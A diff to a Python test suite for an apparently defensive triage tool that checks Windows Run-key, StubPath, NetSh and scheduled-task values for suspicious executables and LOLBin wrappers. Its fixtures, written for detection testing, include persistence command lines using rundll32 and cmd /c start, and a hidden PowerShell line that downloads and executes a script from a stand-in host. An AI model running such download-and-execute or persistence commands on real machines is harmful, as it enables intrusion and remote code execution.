@@ -3,12 +3,16 @@ Run-key variant, and says when a Run value is too long to read.
 
 check_file gets the executable a command line starts (a quoted path, the
 shortest prefix ending in an executable extension before a space, a RunOnceEx
-"||cmd" or "file|Function") and, as before, the value itself; each document
-gets the worse answer. Tasks count the values sent (`checked`) and those that
-name no executable (`not_checked`). RunOnce, RunOnceEx, RunServices and
-RunServicesOnce are read beside Run; Explorer\\RunMRU is not. A Run value over
+"||cmd" or "file|Function"), up to three path arguments with an executable
+extension (what rundll32 or cmd /c start runs; a quoted argument holding more
+than one command is none) and, as before, the value itself; each document gets
+the worst answer at its highest confidence, flagged LOLBin if any answer was.
+Tasks count the values sent (`checked`) and those that name no executable
+(`not_checked`). RunOnce, RunOnceEx, RunServices and RunServicesOnce are read
+beside Run; Explorer\\RunMRU is not. A Run value over
 256 characters has no keyword term, so it can't be read: it is counted
-(`too_long`) and fails the step.
+(`too_long`), fails the step, and the reason says how to find it. StubPath
+and NetSh stamps carry the confidence and the LOLBin flag, as Run keys do.
 
 OpenSearch is a stand-in that runs the queries triage sends, with `.keyword`
 dropping values over 256 characters as `ignore_above` does; check_file answers
@@ -105,6 +109,8 @@ class Cluster:
             for d in hits:
                 d["triage.verdict"] = params["verdict"]
                 d["triage.lolbin"] = d.get("triage.lolbin") or "triage.lolbin'] = true" in src
+                if "params.confidence" in src:
+                    d["triage.confidence"] = params["confidence"]
         return {"updated": len(hits) if "params.verdict" in src else 0, "total": len(hits)}
 
 
@@ -161,9 +167,11 @@ TASK_ANSWERS = {
 def test_a_task_is_checked_by_the_executable_it_starts_and_as_before(triage):
     docs = [{"_id": i, "task.command": v} for i, v in TASKS.items()]
     results, sent, stamps = triage({"case-cmdline-tasks-h1": docs}, TASK_ANSWERS)
-    # the executables (a bare name is none), plus each command sent before that differs
+    # the executables (a bare name is none), the file t8 runs, and each command
+    # sent before that differs
     assert sent == (set(TASK_ANSWERS) - {"powershell.exe"}) | {
         TASKS["t8"],
+        "C:\\Users\\Public\\evil.bat",
         TASKS["t9"],
         TASKS["t10"],
     }
@@ -217,13 +225,14 @@ def test_a_run_key_or_stubpath_is_checked_by_its_executable_and_as_before(triage
     # a LOLBin wrapper's whole line reads SUSPICIOUS (check_file reads its last path)
     wrappers = {v: SUSP for i, _, v in values if i in ("w1", "w2", "b4")}
     _, sent, stamps = triage({"case-cmdline-registry-h1": docs}, {**exes, **wrappers})
-    assert sent == {v for i, _, v in values if i != "r6"} | set(exes)
+    targets = {"C:\\Users\\bob\\AppData\\Roaming\\x.dll"}  # what r2's rundll32 runs
+    assert sent == {v for i, _, v in values if i != "r6"} | set(exes) | targets
     assert stamps == {
         "r1": ("SUSPICIOUS", False), "r2": ("UNKNOWN", True), "r3": ("SUSPICIOUS", False),
         "r4": ("UNKNOWN", False), "r5": ("SUSPICIOUS", False), "r6": (None, False),
         "w1": ("SUSPICIOUS", True), "w2": ("SUSPICIOUS", True), "b4": ("SUSPICIOUS", False),
         "r7": ("SUSPICIOUS", False), "r8": ("SUSPICIOUS", False),
-        "s1": ("SUSPICIOUS", False), "s2": ("UNKNOWN", False),  # StubPath writes no LOLBin flag
+        "s1": ("SUSPICIOUS", False), "s2": ("UNKNOWN", True),  # StubPath writes the LOLBin flag
     }  # fmt: skip
 
 
@@ -300,3 +309,118 @@ def test_a_reply_that_isnt_a_dict_never_escapes(triage, lookups):
     results, _, stamps = triage({"case-cmdline-registry-h1": [doc]}, table)
     assert results["registry_run"]["status"] == "failed", results["registry_run"]
     assert stamps["w1"] == ("SUSPICIOUS", False)
+
+
+# --- the files a command line runs, the long values' query, StubPath and NetSh -
+
+S32 = "C:\\Windows\\System32\\"
+SVCHOST = "C:\\Users\\Public\\svchost.exe"
+SUSP_MED = {"verdict": "SUSPICIOUS", "confidence": "medium", "reasons": ["unexpected dir"]}
+EXPECTED = {"verdict": "EXPECTED", "confidence": "high", "reasons": ["Path matches baseline"]}
+NETSH = "ROOT\\Microsoft\\NetSh"
+UNREGMP2 = "%SystemRoot%\\system32\\unregmp2.exe"
+
+
+def full(docs):
+    """Each doc's stamp: verdict, LOLBin flag, confidence."""
+    return {d["_id"]: (d.get("triage.verdict"), bool(d.get("triage.lolbin")),
+                       d.get("triage.confidence")) for d in docs}  # fmt: skip
+
+
+LINES = {
+    "start": f"rundll32.exe {SVCHOST},Start",
+    "quoted-dll": f'{S32}rundll32.exe "C:\\Program Files\\Vendor App\\x.dll",Start',
+    "cmd-start": f"cmd /c start {SVCHOST} -hidden",
+    "cpl": f"{S32}rundll32.exe C:\\Users\\Public\\p.cpl",
+    "nested": f"cmd /c start {S32}rundll32.exe {SVCHOST},Start",
+    "cmd-nested": f"{S32}cmd.exe /c {S32}rundll32.exe {SVCHOST},Start",
+    "benign-first": f"{S32}rundll32.exe {S32}shell32.dll,ShellExec_RunDLL {SVCHOST} -q",
+    "payload-first": f"{S32}rundll32.exe C:\\Users\\Public\\x2.dll,Run {S32}notepad.exe",
+    "quoted-multi": f'cmd /c "{SVCHOST} & C:\\x\\b.exe"',
+    "quoted-exe": f'"{SVCHOST}" -k netsvcs',
+    "txt-arg": "C:\\Program Files\\Vendor App\\agent.exe /background C:\\x\\a.txt",
+    "last-path": f"{S32}rundll32.exe {SVCHOST}",
+    "tie": f"{S32}rundll32.exe C:\\Users\\Public\\w3.dll",
+}
+STUB_LINE = "rundll32.exe C:\\ProgramData\\x\\y.dll,Install"
+ANSWERS = {
+    SVCHOST: SUSP, "C:\\Program Files\\Vendor App\\x.dll": SUSP, "C:\\Users\\Public\\p.cpl": SUSP,
+    "C:\\ProgramData\\x\\y.dll": SUSP, "C:\\Users\\Public\\x2.dll": SUSP,
+    f"{S32}rundll32.exe": LOLBIN, f"{S32}cmd.exe": LOLBIN,
+    f"{S32}shell32.dll": EXPECTED, f"{S32}notepad.exe": EXPECTED,
+    "C:\\Program Files\\Vendor App\\agent.exe": UNKNOWN,
+    LINES["last-path"]: SUSP,  # check_file reads a line's last path
+    # the whole line high, the file it runs medium: the same verdict, the surer kept
+    LINES["tie"]: SUSP, "C:\\Users\\Public\\w3.dll": SUSP_MED,
+}  # fmt: skip
+
+
+def test_the_files_a_command_line_runs_are_checked_and_the_worst_answer_is_kept(triage):
+    docs = [_reg(i, RUN, v) for i, v in LINES.items()]
+    docs.append({**_reg("stub-dll", SETUP + "{C}", STUB_LINE), "ValueName": "StubPath"})
+    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, ANSWERS)
+    runs = {SVCHOST, "C:\\Program Files\\Vendor App\\x.dll", "C:\\Users\\Public\\p.cpl",
+            "C:\\ProgramData\\x\\y.dll", "C:\\Users\\Public\\x2.dll", f"{S32}shell32.dll",
+            f"{S32}notepad.exe", "C:\\Users\\Public\\w3.dll"}  # fmt: skip
+    # never an entry point, an argument, a quoted multi-command or a part of one
+    never = {f"{SVCHOST},Start", "C:\\ProgramData\\x\\y.dll,Install", f"{SVCHOST} -hidden",
+             f"{SVCHOST} & C:\\x\\b.exe", "C:\\x\\b.exe", "C:\\x\\a.txt",
+             "C:\\Users\\Public\\x2.dll,Run"}  # fmt: skip
+    assert runs <= sent and not never & sent, (runs - sent, never & sent)
+    high, flagged = ("SUSPICIOUS", False, "high"), ("SUSPICIOUS", True, "high")
+    assert full(docs) == {
+        "start": high, "cmd-start": high, "quoted-exe": high, "stub-dll": high,
+        "quoted-dll": flagged, "cpl": flagged, "nested": flagged, "cmd-nested": flagged,
+        "benign-first": flagged, "payload-first": flagged, "last-path": flagged, "tie": flagged,
+        "quoted-multi": ("UNKNOWN", False, "low"), "txt-arg": ("UNKNOWN", False, "low"),
+    }  # fmt: skip
+
+
+def test_at_most_three_files_a_line_runs_are_checked(triage):
+    line = f"{S32}cmd.exe /c C:\\a\\1.exe C:\\a\\2.exe C:\\a\\3.exe C:\\a\\4.exe"
+    _, sent, _ = triage({"case-cmdline-registry-h1": [_reg("m4", RUN, line)]}, {})
+    assert sent == {f"{S32}cmd.exe", "C:\\a\\1.exe", "C:\\a\\2.exe", "C:\\a\\3.exe", line}
+
+
+LONG = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c "
+        "\"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\" "
+        + "#" * 400)[:315]  # fmt: skip
+FINDS_THEM = {"bool": {"filter": [{"exists": {"field": "ValueData"}}],
+                       "must_not": [{"exists": {"field": "ValueData.keyword"}}]}}  # fmt: skip
+
+
+@pytest.mark.parametrize("short", [True, False], ids=["beside short values", "alone"])
+def test_the_reason_says_how_to_find_the_run_values_too_long_to_read(triage, short):
+    docs = [{**_reg("l1", RUN, LONG), "ValueName": "Updater"}]
+    if short:  # two docs share one short value, and a Run value with no data
+        docs += [{**_reg("s1", RUN, "C:\\Users\\Public\\short.exe"), "ValueName": "Short1"},
+                 {**_reg("s2", RUN, "C:\\Users\\Public\\short.exe"), "ValueName": "Short1"},
+                 {"_id": "n0", "KeyPath": RUN, "ValueName": "(default)"}]  # fmt: skip
+    results, sent, _ = triage({"case-cmdline-registry-h1": docs}, {})
+    run = results["registry_run"]
+    assert (run["status"], run["too_long"]) == ("failed", 1), run
+    assert run["reason"] == (
+        "1 Run-key values are over 256 characters and were not checked; find them with "
+        "exists ValueData and not exists ValueData.keyword under the Run keys"
+    )
+    assert LONG not in sent
+    assert [d["_id"] for d in docs if _match(FINDS_THEM, d)] == ["l1"]  # the query it states
+
+
+def test_stubpath_and_netsh_stamps_carry_the_lolbin_flag_and_confidence(triage):
+    docs = [
+        {**_reg("s1", SETUP + "{A}", '"C:\\ProgramData\\x\\svchost.exe" /install'),
+         "ValueName": "StubPath"},
+        {**_reg("s2", SETUP + "{B}", f"{UNREGMP2} /FirstLogon /Shortcuts"),
+         "ValueName": "StubPath"},
+        {**_reg("n1", NETSH, f"{S32}advpack.dll"), "ValueName": "helper1"},
+        {**_reg("n2", NETSH, "C:\\Users\\Public\\nh.dll"), "ValueName": "helper2"},
+    ]  # fmt: skip
+    table = {"C:\\ProgramData\\x\\svchost.exe": SUSP,
+             UNREGMP2: LOLBIN,
+             f"{S32}advpack.dll": LOLBIN, "C:\\Users\\Public\\nh.dll": SUSP}  # fmt: skip
+    triage({"case-cmdline-registry-h1": docs}, table)
+    assert full(docs) == {
+        "s1": ("SUSPICIOUS", False, "high"), "s2": ("UNKNOWN", True, "low"),
+        "n1": ("UNKNOWN", True, "low"), "n2": ("SUSPICIOUS", False, "high"),
+    }  # fmt: skip
